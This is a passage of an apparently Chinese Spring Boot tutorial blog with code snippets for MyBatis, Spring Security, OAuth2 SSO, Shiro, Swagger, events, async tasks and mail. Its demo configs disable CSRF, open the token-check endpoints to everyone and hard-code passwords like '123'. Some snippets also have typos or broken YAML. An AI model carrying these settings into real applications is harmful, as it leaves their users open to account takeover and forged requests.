class="name">insert</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;modifyAccount&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;Account&quot;</span>&gt;</span></span><br><span class="line">        update study.account</span><br><span class="line">        set username = #&#123;username&#125;, password = #&#123;password&#125;</span><br><span class="line">        where _id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteAccount&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">        delete from study.account where _id = #&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一般再创建一个Service层。此处略。</p>
<p>在控制器中使用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line"><span class="meta">@RequestMapping(&quot;/mybatis&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">mybatis</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;Student&gt; students = studentMapper.listStudents();</span><br><span class="line">    <span class="keyword">return</span> students;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><h3 id="Security-模块"><a href="#Security-模块" class="headerlink" title="Security 模块"></a>Security 模块</h3><p>可以访问控制和身份验证。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-security</span><br></pre></td></tr></table></figure>

<p>几个重要的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自定义安全策略</span></span><br><span class="line">WebSecurityConfigurerAdapter</span><br><span class="line"><span class="comment">// 自定义认证策略</span></span><br><span class="line">AuthenticationManagerBuilder</span><br><span class="line"><span class="comment">// 开启Web安全模式</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br></pre></td></tr></table></figure>

<p>添加配置类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CurrentSecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 授权规则</span></span><br><span class="line">        http.authorizeRequests()</span><br><span class="line">            .antMatchers(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">            .permitAll()</span><br><span class="line">            .antMatchers(<span class="string">&quot;/admin/**&quot;</span>)</span><br><span class="line">            .hasRole(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启登录功能</span></span><br><span class="line">        http.formLogin();</span><br><span class="line">        <span class="comment">// 但是不建议使用</span></span><br><span class="line">        http.formLogin().loginPage(<span class="string">&quot;/toLogin&quot;</span>)</span><br><span class="line">            .usernameParameter(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">            .passwordParameter(<span class="string">&quot;pwd&quot;</span>)</span><br><span class="line">            .loginProcessingUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">        <span class="comment">// 开启注销功能 默认为 /logout</span></span><br><span class="line">        http.logout();</span><br><span class="line">        <span class="comment">// 关闭 CSRF</span></span><br><span class="line">        http.csrf().disable();</span><br><span class="line">        <span class="comment">// 开启 Remeber Me</span></span><br><span class="line">        http.rememberMe().rememberMeParameter(<span class="string">&quot;remember&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(AuthenticationManagerBuilder auth)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 认证，可以来源数据库，也可以是内存</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encodePassword</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>().encode(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        auth.inMemoryAuthentication().passwordEncoder(<span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>())</span><br><span class="line">            .withUser(<span class="string">&quot;admin&quot;</span>).password(encodePassword).roles(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">            .and()</span><br><span class="line">            .withUser(<span class="string">&quot;guest&quot;</span>).password(encodePassword).roles(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以与thymeleaf整合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thymeleaf-extras-springsecurity5</span><br></pre></td></tr></table></figure>

<p>在模板中使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 是否登陆 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">sec:authorize</span>=<span class="string">&quot;isAuthenticated()&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用户名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">sec:authentication</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也可以利用Security模块制作单点登录模块。利用Security自带的Web拦截器首先登录拦截。</p>
<p>需要创建<code>OSS Server</code>与客户端，所有登录信息由Server保管。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-web</span><br><span class="line">spring-boot-starter-security</span><br><span class="line">spring-security-oauth2</span><br><span class="line">spring-security-jwt</span><br></pre></td></tr></table></figure>

<p>配置服务的端口和路径</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9090</span></span><br><span class="line">  <span class="attr">context-path:</span> <span class="string">/server</span></span><br></pre></td></tr></table></figure>

<p>添加配置类</p>
<p>首先是认证授权服务器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAuthorizationServer</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AuthorizationServerConfiguration</span> <span class="keyword">extends</span> <span class="title class_">AuthorizationServerConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    AuthenticationManager authenticationManager;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    TokenStore tokenStore;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    BCryptPasswordEncoder encoder;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(ClientDetailsServiceConfigurer clients)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//配置客户端</span></span><br><span class="line">        clients</span><br><span class="line">                .inMemory()</span><br><span class="line">                .withClient(<span class="string">&quot;client&quot;</span>)</span><br><span class="line">                .secret(encoder.encode(<span class="string">&quot;123456&quot;</span>)).resourceIds(<span class="string">&quot;hi&quot;</span>)</span><br><span class="line">                .authorizedGrantTypes(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;refresh_token&quot;</span>)</span><br><span class="line">                .scopes(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(AuthorizationServerEndpointsConfigurer endpoints)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        endpoints</span><br><span class="line">                .tokenStore(tokenStore)</span><br><span class="line">                .authenticationManager(authenticationManager);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(AuthorizationServerSecurityConfigurer oauthServer)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//允许表单认证</span></span><br><span class="line">        oauthServer</span><br><span class="line">                .allowFormAuthenticationForClients()</span><br><span class="line">                .checkTokenAccess(<span class="string">&quot;permitAll()&quot;</span>)</span><br><span class="line">                .tokenKeyAccess(<span class="string">&quot;permitAll()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时配置一个Controller用于客户端请求认证信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/getCurrentUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getCurrentUser</span><span class="params">(Authentication authentication)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> authentication;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>客户端需要在配置类上配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableOAth2Sso</span></span><br><span class="line"><span class="meta">@EnableGlobalMethodSecurity(prePostEnabled = true)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;security.oauth2.sso.login-path:&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String loginPath;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http.authorizeRequests().anyRequest().authenticated()</span><br><span class="line">            .and()</span><br><span class="line">            .csrf().disable();</span><br><span class="line">        <span class="keyword">if</span>(StrngUtils.isNotEmpty(loginPath))&#123;</span><br><span class="line">            http.formLogin().loginProcessingUrl(loginPath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并配置SSO服务器</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9090</span></span><br><span class="line"><span class="attr">security:</span></span><br><span class="line">  <span class="attr">oauth2:</span></span><br><span class="line">    <span class="attr">client:</span></span><br><span class="line">      <span class="attr">client-id:</span> <span class="string">client</span></span><br><span class="line">      <span class="attr">client-secret:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">access-token-uri:</span> <span class="string">http://localhost:9091/oauth/token</span></span><br><span class="line">      <span class="attr">user-authorization-uri:</span> <span class="string">http://localhost:9091/oauth/authorize</span></span><br><span class="line">      <span class="attr">scope:</span> <span class="string">read</span></span><br><span class="line">      <span class="attr">use-current-uri:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">resource:</span></span><br><span class="line">      <span class="attr">user-info-uri:</span> <span class="string">http://localhost:9091/oauth/user</span></span><br></pre></td></tr></table></figure>

<p>对于需要权限的Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasAuthority(&#x27;admin&#x27;)&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/auth/admin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">adminAuth</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Has admin auth!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Shiro-模块"><a href="#Shiro-模块" class="headerlink" title="Shiro 模块"></a>Shiro 模块</h3><p>支持JavaSE环境。使用方式可以参考官方<code>quickstart</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shiro-spring-boot-web-starter</span><br></pre></td></tr></table></figure>

<p>有三大对象：用户，用户管理器，数据库连接模块</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRealm</span> <span class="keyword">extends</span> <span class="title class_">AuthorizingRealm</span> &#123;</span><br><span class="line">        <span class="meta">@Autowired</span></span><br><span class="line">        StudentServiceImpl service;</span><br><span class="line">        <span class="comment">// 授权</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> AuthorizationInfo <span class="title function_">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> &#123;</span><br><span class="line">            <span class="type">SimpleAuthorizationInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleAuthorizationInfo</span>();</span><br><span class="line">            <span class="type">Student</span> <span class="variable">currentStudent</span> <span class="operator">=</span> (Student) SecurityUtils.getSubject().getPrincipal();</span><br><span class="line">            <span class="comment">// 授权，应该在数据库中操作</span></span><br><span class="line">            info.addStringPermission(<span class="string">&quot;user:add&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> info;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 认证</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">            <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> (UsernamePasswordToken) authenticationToken;</span><br><span class="line">            <span class="comment">// 连接数据库</span></span><br><span class="line">            <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> service.getStudentByName(token.getUsername());</span><br><span class="line">            <span class="keyword">if</span>(student == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;   <span class="comment">// 提示用户名不存在  UnknownAccountException</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 传值给 授权，传入密码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleAuthenticationInfo</span>(student, student.getPassword(), <span class="string">&quot;&quot;</span>); <span class="comment">// 密码自动认证</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserRealm <span class="title function_">userRealm</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserRealm</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(<span class="meta">@Qualifier(&quot;userRealm&quot;)</span> UserRealm userRealm)</span> &#123;</span><br><span class="line">        <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">        securityManager.setRealm(userRealm);</span><br><span class="line">        <span class="keyword">return</span> securityManager;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean(name=&quot;shiroFilterFactoryBean&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(<span class="meta">@Qualifier(&quot;getDefaultWebSecurityManager&quot;)</span> DefaultWebSecurityManager manager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">factoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        factoryBean.setSecurityManager(manager);</span><br><span class="line">        <span class="comment">// 为路径添加过滤器,anon,authc,user,perms,role</span></span><br><span class="line">        Map&lt;String, String&gt; filterMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        filterMap.put(<span class="string">&quot;/user/add&quot;</span>, <span class="string">&quot;perms[user:add]&quot;</span>);  <span class="comment">// 用户名为user有add权限才可以进入该目录</span></span><br><span class="line">        filterMap.put(<span class="string">&quot;/user/delete&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">        factoryBean.setFilterChainDefinitionMap(filterMap);</span><br><span class="line">        factoryBean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> factoryBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整合thymeleaf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thymeleaf-extras-shiro</span><br></pre></td></tr></table></figure>

<p>配置<code>ShiroConfig</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroDialect <span class="title function_">getShiroDialect</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ShiroDialect</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">shiro:hasPermission</span>=<span class="string">&quot;user:add&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h2><p>后端API框架，RestFul API，文档自动在线生成，可以在线测试API接口</p>
<p>需要SpringFox支持。</p>
<p>引入包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">springfox-swagger2</span><br><span class="line">springfox-swagger-ui</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwaggerConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">docket</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">                .apiInfo(apiInfo())</span><br><span class="line">                .groupName(<span class="string">&quot;分组1：基本API接口&quot;</span>)</span><br><span class="line">                .enable(<span class="literal">true</span>)  <span class="comment">// 是否启用Swagger</span></span><br><span class="line">                .select().apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.example.demox.controller&quot;</span>))</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfo</span>(</span><br><span class="line">                <span class="string">&quot;doc&quot;</span>,</span><br><span class="line">                <span class="string">&quot;api doc&quot;</span>,</span><br><span class="line">                <span class="string">&quot;1.0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;https://www.baidu.com&quot;</span>,</span><br><span class="line">                ApiInfo.DEFAULT_CONTACT,</span><br><span class="line">                <span class="string">&quot;Apache 2.0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;...&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>/swagger-ui.html</code></p>
<p>给API加说明：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ApiModel(&quot;Info&quot;)</span></span><br><span class="line"><span class="meta">@ApiModelProperty(&quot;info&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(&quot;info&quot;)</span></span><br><span class="line"><span class="meta">@ApiParam()</span></span><br></pre></td></tr></table></figure>




<h2 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h2><h3 id="国际化"><a href="#国际化" class="headerlink" title="国际化"></a>国际化</h3><p>配置中加入</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">messages:</span></span><br><span class="line">    <span class="attr">basename:</span> <span class="string">&quot;i18n.index&quot;</span><span class="attr">spring:  messages:    basename:</span> <span class="string">&quot;i18n.index&quot;</span></span><br></pre></td></tr></table></figure>

<p>模板中修改：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">#&#123;index.title&#125;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="日期格式化"><a href="#日期格式化" class="headerlink" title="日期格式化"></a>日期格式化</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">date-format:</span> <span class="string">&quot;yyyy-MM-dd&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="事件机制"><a href="#事件机制" class="headerlink" title="事件机制"></a>事件机制</h2><p>实现事件机制需要3个部分：事件，发布者，监听器。</p>
<p>首先定义一个事件，需要继承<code>ApplicationEvent</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeviceOnlineEvent</span> <span class="keyword">extends</span> <span class="title class_">ApplicationEvent</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String deviceId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DeviceOnlineEvent</span><span class="params">(Object source, String deviceId)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(source);</span><br><span class="line">        <span class="built_in">this</span>.deviceId = deviceId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDeviceId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> deviceId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一个事件的发布者，注入到Bean中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeviceEventPublisher</span> <span class="keyword">implements</span> <span class="title class_">ApplicationContextAware</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ApplicationContext ctx;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setApplicationContext</span><span class="params">(<span class="meta">@NotNull</span> ApplicationContext applicationContext)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">        <span class="built_in">this</span>.ctx = applicationContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">publishEvent</span><span class="params">(ConnectionState state, String msg)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (state == ConnectionState.CONNECTED) &#123;</span><br><span class="line">            ctx.publishEvent(<span class="keyword">new</span> <span class="title class_">DeviceOnlineEvent</span>(<span class="built_in">this</span>, msg));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ctx.publishEvent(<span class="keyword">new</span> <span class="title class_">DeviceOfflineEvent</span>(<span class="built_in">this</span>,msg)) ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一个事件的监听器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EventListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDeviceConnected</span><span class="params">(DeviceOnlineEvent event)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">deviceId</span> <span class="operator">=</span> event.getDeviceId();</span><br><span class="line">    deviceManager.putIfAbsent(deviceId, <span class="keyword">new</span> <span class="title class_">DeviceItem</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在发布事件时，只需要注入事件发布器，发布事件即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">deviceEventPublisher.publishEvent(ConnectionState.CONNECTED, deviceId);</span><br></pre></td></tr></table></figure>



<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><h3 id="异步任务"><a href="#异步任务" class="headerlink" title="异步任务"></a>异步任务</h3><p>首先开启异步功能</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableAsync</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoFirstApplication</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		SpringApplication.run(DemoFirstApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义异步服务<code>AsyncService.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncService</span> &#123;</span><br><span class="line">    <span class="meta">@Async</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="邮件任务"><a href="#邮件任务" class="headerlink" title="邮件任务"></a>邮件任务</h3><p>导入包<code>javax.mail</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-boot-starter-mail</span><br></pre></td></tr></table></figure>

<p>配置邮件服务</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mail:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">&quot;123@123.com&quot;</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">  <span class="attr">host:</span> <span class="string">&quot;smtp.qq.com&quot;</span></span><br><span class="line">  <span class="attr">properties:</span></span><br><span class="line">    <span class="attr">mail:</span></span><br><span class="line">    <span class="attr">smtp:</span></span><br><span class="line">      <span class="attr">ssl:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">JavaMailSenderImpl javaMailSender;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">sendMail</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SimpleMailMessage</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleMailMessage</span>();</span><br><span class="line">    message.setSubject(<span class="string">&quot;subject&quot;</span>);</span><br><span class="line">    message.setText(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    message.setFrom(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">    message.setTo(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">    javaMailSender.send(message);</span><br><span class="line"></span><br><span class="line">    <span class="type">MimeMessage</span> <span class="variable">mimeMessage</span> <span class="operator">=</span> javaMailSender.createMimeMessage();</span><br><span class="line">    <span class="type">MimeMessageHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeMessageHelper</span>(mimeMessage, <span 